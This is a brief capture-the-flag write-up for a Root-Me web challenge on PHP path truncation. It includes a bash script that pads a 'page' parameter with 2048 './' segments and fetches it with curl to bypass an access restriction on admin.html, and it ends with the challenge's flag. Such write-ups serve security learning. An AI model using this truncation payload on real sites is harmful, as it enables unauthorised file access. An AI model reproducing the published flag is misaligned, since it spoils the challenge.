## Challenge name: PHP - Path Truncation

``` Challenge Link:``` [https://www.root-me.org/en/Challenges/Web-Server/PHP-Path-Truncation](https://www.root-me.org/en/Challenges/Web-Server/PHP-Path-Truncation)

**As we start the challenge we can see two pages with links. admin.html is prohibited from accessing.**

**The website automatically adds `.php` after the page parameter. PHP path truncation (version <= 5.x) truncates paths longer than 4096 bytes.**

**Craft a bash payload:**
```bash
BASE_URL="http://challenge01.root-me.org/web-serveur/ch35/index.php?page=x/../admin.html/"
PAYLOAD=$(printf './%.0s' {1..2048})
curl "${BASE_URL}${PAYLOAD}"
```

**We can use this "110V3TrUnC4T10n" as flag/passwd to validate..**
